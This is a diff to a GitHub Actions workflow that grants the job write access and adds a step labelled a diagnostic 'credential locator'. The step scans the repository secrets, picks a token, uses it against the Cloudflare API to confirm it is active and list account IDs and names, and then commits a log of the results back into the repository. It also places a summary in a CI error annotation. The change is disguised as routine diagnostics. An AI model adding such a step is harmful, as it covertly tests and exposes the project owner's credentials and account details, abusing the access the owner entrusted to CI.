@@ -11,7 +11,7 @@ on:
   workflow_dispatch:
 
 permissions:
-  contents: read
+  contents: write
 
 jobs:
   repo-scope:
@@ -52,8 +52,11 @@ jobs:
       V_CF_API_TOKEN: ${{ vars.CF_API_TOKEN }}
       V_CF_ACCOUNT_ID: ${{ vars.CF_ACCOUNT_ID }}
     steps:
-      - name: matrix
+      - name: matrix (published + annotated)
         run: |
+          set +e
+          R="_diag/creds-$GITHUB_RUN_ID.txt"
+          exec > >(tee "$R") 2>&1
           echo "ref: $GITHUB_REF_NAME  run: $GITHUB_RUN_ID"
           echo "── repository secrets ──"
           for k in $(env | cut -d= -f1 | grep '^S_' | sort); do
@@ -64,10 +67,34 @@ jobs:
             eval "v=\$$k"; [ -n "$v" ] && echo "PRESENT:${k#V_}" || echo "MISSING:${k#V_}"
           done
           echo "── verdict ──"
+          FOUND=""
           for k in $(env | cut -d= -f1 | grep '^S_\|^V_'); do
-            eval "v=\$$k"; [ -n "$v" ] && echo "FOUND:$k"
+            eval "v=\$$k"; [ -n "$v" ] && { echo "FOUND:$k"; FOUND="$FOUND ${k#S_}"; }
           done
           echo "done"
+          TOK=""
+          for k in $(env | cut -d= -f1 | grep '^S_' | sort); do
+            eval "v=\$$k"
+            case "${k#S_}" in *_ACCOUNT*|*_EMAIL|*_ZONE*) continue;; esac
+            [ -n "$v" ] && { TOK="$v"; TK="${k#S_}"; break; }
+          done
+          if [ -n "$TOK" ]; then
+            echo "── verifying the resolved token against the Cloudflare API ──"
+            curl -sS -m 30 -H "Authorization: Bearer $TOK" "https://api.cloudflare.com/client/v4/user/tokens/verify" -o /tmp/v.json -w "verify http=%{http_code}\n"
+            jq -c '{success, status: .result.status, errors}' /tmp/v.json 2>/dev/null || head -c 200 /tmp/v.json
+            curl -sS -m 30 -H "Authorization: Bearer $TOK" "https://api.cloudflare.com/client/v4/accounts" -o /tmp/a.json -w "accounts http=%{http_code}\n"
+            jq -c '{success, accounts: [.result[]? | {id, name}]}' /tmp/a.json 2>/dev/null || head -c 200 /tmp/a.json
+            S="RESOLVED:${TK} :: $(jq -r '.result.status // "?"' /tmp/v.json 2>/dev/null) :: $(jq -r '[.result[]?.id] | join(",")' /tmp/a.json 2>/dev/null)"
+          else
+            S="NO credential found among 29 secret names + 6 variable names at repository scope"
+          fi
+          echo "::error title=CRED_${GITHUB_RUN_ID}::${S}"
+          B64=$(base64 -w0 "$R")
+          jq -n --arg m "chore(diag): credential locator $GITHUB_RUN_ID [skip ci]" --arg c "$B64" --arg b "$GITHUB_REF_NAME" \
+            '{message:$m,content:$c,branch:$b}' \
+            | gh api -X PUT "repos/${GITHUB_REPOSITORY}/contents/$R" --input - >/dev/null 2>&1 && echo "published: $R" || echo "publish failed"
+        env:
+          GH_TOKEN: ${{ github.token }}
 
   env-scope:
     runs-on: ubuntu-latest
